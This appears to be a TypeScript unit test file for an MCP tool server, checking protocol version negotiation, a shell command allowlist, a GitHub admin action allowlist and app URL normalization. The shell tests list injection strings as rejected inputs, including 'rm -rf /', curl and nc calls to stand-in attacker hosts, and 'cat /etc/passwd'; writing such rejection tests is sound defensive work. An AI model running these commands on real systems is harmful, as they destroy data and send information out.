// Unit tests for the final hardening pass:
//   - MCP protocol version negotiation (client compatibility)
//   - shell.read allowlist + injection rejection
//   - github.admin bounded action allowlist
//   - registry <-> risk-engine metadata alignment
// Pure logic; no server, DB or network required.
// Run: bun run tests/mcp-hardening-unit.ts

import { negotiateProtocolVersion, SUPPORTED_PROTOCOL_VERSIONS, MCP_PROTOCOL_VERSION, buildToolList } from "../src/lib/mcp/server"
import { shellRead, githubAdmin } from "../src/lib/tools/adapters"
import { TOOL_REGISTRY } from "../src/lib/tool-registry"
import { getToolBaseRisk } from "../src/lib/risk"

let pass = 0, fail = 0
function check(name: string, cond: boolean, detail = "") {
  if (cond) { pass++; console.log(`  PASS  ${name}${detail ? ` — ${detail}` : ""}`) }
  else { fail++; console.log(`  FAIL  ${name}${detail ? ` — ${detail}` : ""}`) }
}

console.log("\n=== MCP protocol version negotiation (AI client compatibility) ===")
for (const v of SUPPORTED_PROTOCOL_VERSIONS) {
  check(`echoes supported version ${v}`, negotiateProtocolVersion(v) === v)
}
check("unsupported version -> newest supported", negotiateProtocolVersion("1999-01-01") === SUPPORTED_PROTOCOL_VERSIONS[0], negotiateProtocolVersion("1999-01-01"))
check("missing version -> conservative baseline (back-compat)", negotiateProtocolVersion(undefined) === MCP_PROTOCOL_VERSION)
check("non-string version -> baseline", negotiateProtocolVersion(42) === MCP_PROTOCOL_VERSION)
check("supports 2025-06-18 (Claude connectors)", (SUPPORTED_PROTOCOL_VERSIONS as readonly string[]).includes("2025-06-18"))
check("supports 2025-03-26 (Cursor/ChatGPT era)", (SUPPORTED_PROTOCOL_VERSIONS as readonly string[]).includes("2025-03-26"))

console.log("\n=== shell.read — injection & allowlist enforcement ===")
const inject = [
  "git status; rm -rf /",
  "git status && curl evil.com",
  "git status | nc attacker 1234",
  "git status `whoami`",
  "git status $(id)",
  "cat /etc/passwd",
  "rm -rf .",
  "node -e 'require(\"child_process\")'",
]
for (const cmd of inject) {
  const r = await shellRead({ command: cmd })
  const code = (r.output as { code?: string }).code
  check(`rejects: ${cmd.slice(0, 34)}`, r.ok === false && (code === "COMMAND_REJECTED" || code === "COMMAND_NOT_ALLOWED"), String(code))
}
const empty = await shellRead({ command: "" })
check("rejects empty command", empty.ok === false)
const notAllowedArgs = await shellRead({ command: "git push" })
check("rejects allowlisted binary with non-allowlisted args (git push)", notAllowedArgs.ok === false, String((notAllowedArgs.output as { code?: string }).code))
// An allowlisted invocation must at least be ATTEMPTED (not refused by the guard).
const allowed = await shellRead({ command: "node --version" })
const allowedCode = (allowed.output as { code?: string }).code
check("allowlisted 'node --version' is executed, not refused", allowedCode !== "COMMAND_NOT_ALLOWED" && allowedCode !== "COMMAND_REJECTED", allowed.ok ? `stdout=${String((allowed.output as { stdout?: string }).stdout).trim()}` : String(allowedCode))

console.log("\n=== github.admin — bounded action allowlist ===")
const badAction = await githubAdmin({ repo: "a/b", action: "delete-everything" }, { sessionId: "t" })
check("unsupported admin action refused", (badAction.output as { code?: string }).code === "UNSUPPORTED_ACTION")
check("refusal lists the supported actions", Array.isArray((badAction.output as { supportedActions?: string[] }).supportedActions))
// A supported action proceeds past the allowlist to credential resolution.
const goodAction = await githubAdmin({ repo: "a/b", action: "list-collaborators" }, { sessionId: "t" })
check("supported action passes allowlist (reaches credential step)", (goodAction.output as { code?: string }).code !== "UNSUPPORTED_ACTION", String((goodAction.output as { code?: string }).code))

console.log("\n=== app URL normalization (regression: malformed dashboard value) ===")
// Production served issuer "Deployment\nshadowpaste-...vercel.app" — a pasted
// dashboard label plus a scheme-less host — because the env value was trusted
// verbatim. That poisoned the OAuth issuer and every discovery endpoint.
const { normalizeAppUrl } = await import("../src/lib/app-url")
check("recovers URL from label + newline + no scheme",
  normalizeAppUrl("Deployment\nshadowpaste-rj2yham8x-shadow-94a2.vercel.app") === "https://shadowpaste-rj2yham8x-shadow-94a2.vercel.app",
  String(normalizeAppUrl("Deployment\nshadowpaste-rj2yham8x-shadow-94a2.vercel.app")))
check("adds https:// to a bare host", normalizeAppUrl("shadowpaste-xi.vercel.app") === "https://shadowpaste-xi.vercel.app")
check("strips trailing slashes", normalizeAppUrl("https://a.example.com///") === "https://a.example.com")
check("keeps localhost scheme for dev", normalizeAppUrl("http://localhost:3000") === "http://localhost:3000")
check("rejects unsalvageable prose", normalizeAppUrl("Deployment Ready") === null)
check("rejects empty / undefined", normalizeAppUrl("") === null && normalizeAppUrl(undefined) === null)
check("never returns a value containing whitespace",
  ["Deployment\nx.example.com", " https://y.example.com ", "a b c"].every((v) => {
    const r = normalizeAppUrl(v); return r === null || !/\s/.test(r)
  }))

console.log("\n=== registry <-> risk engine alignment (no metadata drift) ===")
let drift = 0
for (const t of TOOL_REGISTRY) {
  const e = getToolBaseRisk(t.name)
  if (e.score !== t.riskScore || e.level !== t.riskLevel) { drift++; console.log(`    DRIFT ${t.name}: registry=${t.riskScore}/${t.riskLevel} engine=${e.score}/${e.level}`) }
}
check("all 28 tools agree between registry and risk engine", drift === 0, `${drift} drift(s)`)

console.log("\n=== tools/list implementation metadata ===")
const tools = buildToolList()
check("28 tools advertised", tools.length === 28, `${tools.length}`)
const implemented = tools.filter((t) => (t.annotations as { implemented: boolean }).implemented).length
check("20 tools report implemented", implemented === 20, `${implemented}`)

console.log(`\nRESULT ${pass} passed, ${fail} failed`)
process.exit(fail === 0 ? 0 : 1)
